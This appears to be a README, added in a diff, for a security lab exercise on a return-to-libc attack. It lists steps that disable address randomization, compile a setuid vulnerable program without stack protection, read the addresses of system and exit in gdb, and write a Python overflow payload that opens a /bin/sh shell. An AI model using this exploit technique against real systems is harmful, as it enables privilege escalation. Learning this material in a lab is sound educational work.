@@ -1,0 +1,33 @@
+Steps used to execute the program and perform RTL attack:
+
+1) Turn off address randomization
+
+- sudo sysctl -w kernel.randomize_va_space=0
+
+2) Set Environment Variables for /bin/sh address
+
+- export MYSHELL="/bin/sh"
+
+3)Extract 'system' & 'exit' addresses by compiling and running the vul.c file once
+
+- $ gcc -g -fno-stack-protector -m32 vul.c -o vul
+- $ chmod 4755 vul
+- $ gdb ./vul
+- (gdb) r
+- (gdb) p system
+- (gdb) p exit
+
+4) Extract the address for '/bin/sh' using exp.c file
+
+- $ gcc -g -fno-stack-protector -m32 exp.c -o exp 
+- $ gdb ./exp
+- (gdb) r
+
+5) Now perform the attack by using a python script and concatenation addresses for 'system', 'exit'& '/bin/sh'
+
+- $ (python -c'print "A"*23 +"\x30\xf4\xe5\xb7"+"\xb0\x2f\xe5\xb7"+"\x8f\xfe\xff\xbf"')>badfile
+- $ gcc -g -fno-stack-protector -m32 vul.c -o vul
+- $ gdb ./vul
+- (gdb) r
+
+This will open a /bin/sh shell and execute the RTL attack
